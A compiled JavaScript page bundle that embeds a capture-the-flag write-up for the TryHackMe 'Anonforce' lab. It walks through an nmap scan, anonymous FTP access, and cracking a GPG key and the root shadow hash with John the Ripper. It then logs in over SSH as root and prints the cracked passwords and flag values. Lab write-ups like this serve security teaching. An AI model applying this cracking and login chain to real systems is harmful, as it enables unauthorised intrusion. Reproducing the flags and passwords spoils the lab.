"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[3821],{3905:(n,e,r)=>{r.d(e,{Zo:()=>u,kt:()=>x});var t=r(67294);function o(n,e,r){return e in n?Object.defineProperty(n,e,{value:r,enumerable:!0,configurable:!0,writable:!0}):n[e]=r,n}function s(n,e){var r=Object.keys(n);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(n);e&&(t=t.filter((function(e){return Object.getOwnPropertyDescriptor(n,e).enumerable}))),r.push.apply(r,t)}return r}function a(n){for(var e=1;e<arguments.length;e++){var r=null!=arguments[e]?arguments[e]:{};e%2?s(Object(r),!0).forEach((function(e){o(n,e,r[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(n,Object.getOwnPropertyDescriptors(r)):s(Object(r)).forEach((function(e){Object.defineProperty(n,e,Object.getOwnPropertyDescriptor(r,e))}))}return n}function i(n,e){if(null==n)return{};var r,t,o=function(n,e){if(null==n)return{};var r,t,o={},s=Object.keys(n);for(t=0;t<s.length;t++)r=s[t],e.indexOf(r)>=0||(o[r]=n[r]);return o}(n,e);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(n);for(t=0;t<s.length;t++)r=s[t],e.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(n,r)&&(o[r]=n[r])}return o}var c=t.createContext({}),l=function(n){var e=t.useContext(c),r=e;return n&&(r="function"==typeof n?n(e):a(a({},e),n)),r},u=function(n){var e=l(n.components);return t.createElement(c.Provider,{value:e},n.children)},d="mdxType",p={inlineCode:"code",wrapper:function(n){var e=n.children;return t.createElement(t.Fragment,{},e)}},m=t.forwardRef((function(n,e){var r=n.components,o=n.mdxType,s=n.originalType,c=n.parentName,u=i(n,["components","mdxType","originalType","parentName"]),d=l(r),m=o,x=d["".concat(c,".").concat(m)]||d[m]||p[m]||s;return r?t.createElement(x,a(a({ref:e},u),{},{components:r})):t.createElement(x,a({ref:e},u))}));function x(n,e){var r=arguments,o=e&&e.mdxType;if("string"==typeof n||o){var s=r.length,a=new Array(s);a[0]=m;var i={};for(var c in e)hasOwnProperty.call(e,c)&&(i[c]=e[c]);i.originalType=n,i[d]="string"==typeof n?n:o,a[1]=i;for(var l=2;l<s;l++)a[l]=r[l];return t.createElement.apply(null,a)}return t.createElement.apply(null,r)}m.displayName="MDXCreateElement"},7550:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>c,contentTitle:()=>a,default:()=>p,frontMatter:()=>s,metadata:()=>i,toc:()=>l});var t=r(87462),o=(r(67294),r(3905));const s={},a="Anonforce",i={unversionedId:"Tryhackme/Anonforce/Anonforce",id:"Tryhackme/Anonforce/Anonforce",title:"Anonforce",description:"boot2root machine for FIT and bsides guatemala CTF",source:"@site/writeups/Tryhackme/Anonforce/Anonforce.md",sourceDirName:"Tryhackme/Anonforce",slug:"/Tryhackme/Anonforce/",permalink:"/writeups/Tryhackme/Anonforce/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Alfred",permalink:"/writeups/Tryhackme/Alfred/"},next:{title:"Anonymous",permalink:"/writeups/Tryhackme/Anonymous/"}},c={},l=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Anonforce Machine",id:"task-1-anonforce-machine",level:2}],u={toc:l},d="wrapper";function p(n){let{components:e,...r}=n;return(0,o.kt)(d,(0,t.Z)({},u,r,{components:e,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"anonforce"},"Anonforce"),(0,o.kt)("p",null,"boot2root machine for FIT and bsides guatemala CTF"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/bsidesgtanonforce"},"Anonforce")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"FTP Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Brute Forcing GPG"),(0,o.kt)("li",{parentName:"ul"},"Backup Poking"),(0,o.kt)("li",{parentName:"ul"},"Brute Forcing Hash")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-anonforce-machine"},"Task 1 Anonforce Machine"),(0,o.kt)("p",null,"Read user.txt and root.txt"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Anonforce$ sudo nmap -A -sS -sC -sV -O 10.10.119.81\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 16:23 CEST\nNmap scan report for 10.10.119.81\nHost is up (0.038s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin\n| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot\n| drwxr-xr-x   17 0        0            3700 Oct 14 07:21 dev\n| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc\n| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home\n| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic\n| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic\n| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib\n| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64\n| drwx------    2 0        0           16384 Aug 11  2019 lost+found\n| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media\n| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt\n| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]\n| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt\n| dr-xr-xr-x  103 0        0               0 Oct 14 07:21 proc\n| drwx------    3 0        0            4096 Aug 11  2019 root\n| drwxr-xr-x   18 0        0             540 Oct 14 07:22 run\n| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin\n| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv\n| dr-xr-xr-x   13 0        0               0 Oct 14 07:21 sys\n|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:10.8.106.222\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 2\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)\n|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)\n|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/14%OT=21%CT=1%CU=44771%PV=Y%DS=2%DC=T%G=Y%TM=5F8709\nOS:E5%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=100%TI=Z%CI=I%II=I%TS=8)OPS\nOS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1\nOS:1NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN\nOS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 23/tcp)\nHOP RTT      ADDRESS\n1   37.40 ms 10.8.0.1\n2   37.74 ms 10.10.119.81\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 18.52 seconds\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Anonforce$ ftp 10.10.119.81\nConnected to 10.10.119.81.\n220 (vsFTPd 3.0.3)\nName (10.10.119.81:kali): anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    2 0        0            4096 Aug 11  2019 bin\ndrwxr-xr-x    3 0        0            4096 Aug 11  2019 boot\ndrwxr-xr-x   17 0        0            3700 Oct 14 07:21 dev\ndrwxr-xr-x   85 0        0            4096 Aug 13  2019 etc\ndrwxr-xr-x    3 0        0            4096 Aug 11  2019 home\nlrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic\nlrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic\ndrwxr-xr-x   19 0        0            4096 Aug 11  2019 lib\ndrwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64\ndrwx------    2 0        0           16384 Aug 11  2019 lost+found\ndrwxr-xr-x    4 0        0            4096 Aug 11  2019 media\ndrwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt\ndrwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread\ndrwxr-xr-x    2 0        0            4096 Aug 11  2019 opt\ndr-xr-xr-x  101 0        0               0 Oct 14 07:21 proc\ndrwx------    3 0        0            4096 Aug 11  2019 root\ndrwxr-xr-x   18 0        0             540 Oct 14 07:22 run\ndrwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin\ndrwxr-xr-x    3 0        0            4096 Aug 11  2019 srv\ndr-xr-xr-x   13 0        0               0 Oct 14 07:21 sys\ndrwxrwxrwt    9 0        0            4096 Oct 14 07:21 tmp\ndrwxr-xr-x   10 0        0            4096 Aug 11  2019 usr\ndrwxr-xr-x   11 0        0            4096 Aug 11  2019 var\nlrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic\nlrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic\n226 Directory send OK.\nftp> pwd\n257 "/" is the current directory\nftp> cd home\n250 Directory successfully changed.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias\n226 Directory send OK.\nftp> cd melodias\n250 Directory successfully changed.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt\n226 Directory send OK.\nftp> get user.txt\nlocal: user.txt remote: user.txt\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for user.txt (33 bytes).\n226 Transfer complete.\n33 bytes received in 0.00 secs (749.4550 kB/s)\n\nkali@kali:~/CTFs/tryhackme/Anonforce$ cat user.txt\n606083fd33beb1284fc51f411a706af8\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Anonforce$ gpg2john private.asc > pgp.hash\nFile private.asc\n\nkali@kali:~/CTFs/tryhackme/Anonforce$ john pgp.hash --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])\nCost 1 (s2k-count) is 65536 for all loaded hashes\nCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes\nCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nxbox360          (anonforce)\n1g 0:00:00:00 DONE (2020-10-14 16:28) 7.692g/s 7153p/s 7153c/s 7153C/s xbox360..sheena\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Anonforce$ gpg --import private.asc\ngpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed\ngpg: key B92CD1F280AD82C2: secret key imported\ngpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed\ngpg: Total number processed: 2\ngpg:              unchanged: 2\ngpg:       secret keys read: 1\ngpg:   secret keys imported: 1\nkali@kali:~/CTFs/tryhackme/Anonforce$ gpg --decrypt backup.pgp\ngpg: WARNING: cipher algorithm CAST5 not found in recipient preferences\ngpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12\n      "anonforce <melodias@anonforce.nsa>"\nroot:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::\ndaemon:*:17953:0:99999:7:::\nbin:*:17953:0:99999:7:::\nsys:*:17953:0:99999:7:::\nsync:*:17953:0:99999:7:::\ngames:*:17953:0:99999:7:::\nman:*:17953:0:99999:7:::\nlp:*:17953:0:99999:7:::\nmail:*:17953:0:99999:7:::\nnews:*:17953:0:99999:7:::\nuucp:*:17953:0:99999:7:::\nproxy:*:17953:0:99999:7:::\nwww-data:*:17953:0:99999:7:::\nbackup:*:17953:0:99999:7:::\nlist:*:17953:0:99999:7:::\nirc:*:17953:0:99999:7:::\ngnats:*:17953:0:99999:7:::\nnobody:*:17953:0:99999:7:::\nsystemd-timesync:*:17953:0:99999:7:::\nsystemd-network:*:17953:0:99999:7:::\nsystemd-resolve:*:17953:0:99999:7:::\nsystemd-bus-proxy:*:17953:0:99999:7:::\nsyslog:*:17953:0:99999:7:::\n_apt:*:17953:0:99999:7:::\nmessagebus:*:18120:0:99999:7:::\nuuidd:*:18120:0:99999:7:::\nmelodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::\nsshd:*:18120:0:99999:7:::\nftp:*:18120:0:99999:7:::\n\nkali@kali:~/CTFs/tryhackme/Anonforce$ john root.hash --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])\nCost 1 (iteration count) is 5000 for all loaded hashes\nWill run 2 OpenMP threads\nPress \'q\' or Ctrl-C to abort, almost any other key for status\nhikari           (?)\n1g 0:00:00:03 DONE (2020-10-14 16:33) 0.3194g/s 2208p/s 2208c/s 2208C/s 98765432..better\nUse the "--show" option to display all of the cracked passwords reliably\nSession completed\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Anonforce$ ssh root@10.10.119.81\nThe authenticity of host '10.10.119.81 (10.10.119.81)' can't be established.\nECDSA key fingerprint is SHA256:5evbK4JjQatGFwpn/RYHt5C3A6banBkqnngz4IVXyz0.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.119.81' (ECDSA) to the list of known hosts.\nroot@10.10.119.81's password:\nWelcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\nroot@ubuntu:~# cd /root\nroot@ubuntu:~# ls\nroot.txt\nroot@ubuntu:~# cat root.txt\nf706456440c7af4187810c31c6cebdce\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"user.txt")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"606083fd33beb1284fc51f411a706af8")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"root.txt")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"f706456440c7af4187810c31c6cebdce")))}p.isMDXComponent=!0}}]);